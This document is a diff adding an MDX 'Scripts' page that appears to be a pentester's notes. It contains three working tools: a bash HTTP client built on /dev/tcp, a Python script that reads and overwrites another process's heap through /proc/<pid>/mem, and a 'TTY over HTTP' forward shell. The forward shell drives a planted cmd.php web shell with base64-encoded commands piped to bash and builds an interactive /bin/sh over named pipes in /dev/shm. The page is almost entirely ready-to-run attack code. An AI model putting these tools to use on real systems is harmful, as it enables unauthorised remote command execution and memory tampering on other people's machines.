@@ -1,0 +1,209 @@
+import { HeroPattern } from '@/components/HeroPattern'
+import { Heading } from '@/components/Heading'
+
+export const metadata = {
+  title: '',
+  description: '',
+}
+
+export const sections = [
+  { title: '__curl', id: '__curl', },
+  { title: 'Hack memory process', id: 'hack-mem-proc', },
+  { title: 'TTY over HTTP', id: 'tty-over-http', },
+]
+
+<HeroPattern />
+
+# Scripts
+
+## __curl {{ id: '__curl' }}
+
+This is a simple implementation of `curl` using bash.
+
+```bash
+function __curl() {
+  read -r proto server path <<<"$(printf '%s' "${1//// }")"
+  if [ "$proto" != "http:" ]; then
+    printf >&2 "sorry, %s supports only http\n" "${FUNCNAME[0]}"
+    return 1
+  fi
+  DOC=/${path// //}
+  HOST=${server//:*}
+  PORT=${server//*:}
+  [ "${HOST}" = "${PORT}" ] && PORT=80
+
+  exec 3<>"/dev/tcp/${HOST}/$PORT"
+  printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' "${DOC}" "${HOST}" >&3
+  (while read -r line; do
+   [ "$line" = $'\r' ] && break
+  done && cat) <&3
+  exec 3>&-
+}
+```
+
+## Hack memory process {{ id: 'hack-mem-proc' }}
+
+This is a simple script to read and write to the heap of a process in Linux.
+
+```bash
+#!/usr/bin/env python3
+
+from sys import argv, exit
+
+
+def print_usage():
+    """Print the usage string if script was used improperly"""
+    print(
+        "Usage: \
+                \t$ {} <pid> <string to read> <string to write>".format(argv[0])
+    )
+    exit(1)
+
+
+def read_write_heap(pid, read_str, write_str):
+    """Find @read_str in the heap of @pid and replace it with @write_str"""
+    try:
+        maps_file = open("/proc/{}/maps".format(pid), "r")
+    except IOError as e:
+        print("Can't open file /proc/{}/maps: IOError: {}".format(pid, e))
+        exit(1)
+    heap_info = None
+    for line in maps_file:
+        if "heap" in line:
+            heap_info = line.split()
+    maps_file.close()
+    if heap_info is None:
+        print("No heap found!")
+        exit(1)
+    addr = heap_info[0].split("-")
+    perms = heap_info[1]
+    if "r" not in perms or "w" not in perms:
+        print("Heap does not have read and/or write permission")
+        exit(0)
+    try:
+        mem_file = open("/proc/{}/mem".format(pid), "rb+")
+    except IOError as e:
+        print("Can't open file /proc/{}/maps: IOError: {}".format(pid, e))
+        exit(1)
+    heap_start = int(addr[0], 16)
+    heap_end = int(addr[1], 16)
+    mem_file.seek(heap_start)
+    heap = mem_file.read(heap_end - heap_start)
+    str_offset = heap.find(bytes(read_str, "ASCII"))
+    if str_offset < 0:
+        print("Can't find {} in /proc/{}/mem".format(read_str, pid))
+        exit(1)
+    mem_file.seek(heap_start + str_offset)
+    diff = len(read_str) - len(write_str) + 1
+    if diff > 0:
+        write_str += " " * diff
+    mem_file.write(bytes(write_str, "ASCII"))
+
+
+if len(argv) == 4:
+    pid = argv[1]
+    search_str = argv[2]
+    replace_str = argv[3]
+    read_write_heap(pid, search_str, replace_str)
+else:
+    print_usage()
+```
+
+## TTY over HTTP {{ id: 'tty-over-http' }}
+
+This is a interactive TTY using HTTP implemented in Python3
+
+```python
+#!/bin/python3
+
+import requests, threading, signal, time, sys
+from random import randrange
+from base64 import b64encode
+
+
+def handler(sig, frame):
+    print("\n\n[!] Exiting...\n")
+    run_cmd(erase_stdin)
+    run_cmd(erase_stdout)
+    sys.exit(1)
+
+
+signal.signal(signal.SIGINT, handler)
+
+main_url = "http://localhost/cmd.php"
+session = randrange(1000, 9999)
+stdin = "/dev/shm/%s.input" % session
+stdout = "/dev/shm/%s.output" % session
+erase_stdin = "/bin/rm %s" % stdin
+erase_stdout = "/bin/rm %s" % stdout
+
+
+class all_the_reads(object):
+    def __init__(self, interval=1):
+        self.interval = interval
+        thread = threading.Thread(target=self.run, args=())
+        thread.daemon = True
+        thread.start()
+
+    def run(self):
+        clear_output = "echo '' > %s" % stdout
+        read_output = "/bin/cat %s" % stdout
+
+        while True:
+            output = run_cmd(read_output)
+            if output:
+                run_cmd(clear_output)
+                print(output)
+
+            time.sleep(self.interval)
+
+
+def run_cmd(cmd):
+    cmd = cmd.encode()
+    cmd = b64encode(cmd).decode()
+
+    post_data = {"cmd": "echo %s | base64 -d | bash" % cmd}
+
+    r = (requests.post(main_url, data=post_data, timeout=5).text).strip()
+
+    return r
+
+
+def setup_shell():
+    named_pipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (
+        stdin,
+        stdin,
+        stdout,
+    )
+
+    try:
+        run_cmd(named_pipes)
+    except:
+        None
+
+    return None
+
+
+def write_cmd(cmd):
+    cmd = cmd.encode()
+    cmd = b64encode(cmd).decode()
+
+    post_data = {"cmd": "echo %s | base64 -d > %s" % (cmd, stdin)}
+
+    r = (requests.post(main_url, data=post_data, timeout=5).text).strip()
+
+
+def read_cmd():
+    read_output = "/bin/cat %s" % stdout
+    output = run_cmd(read_output)
+    return output
+
+
+if __name__ == "__main__":
+    setup_shell()
+    read_all_threads = all_the_reads()
+    while True:
+        command = input("> ")
+        write_cmd(command + "\n")
+
+```
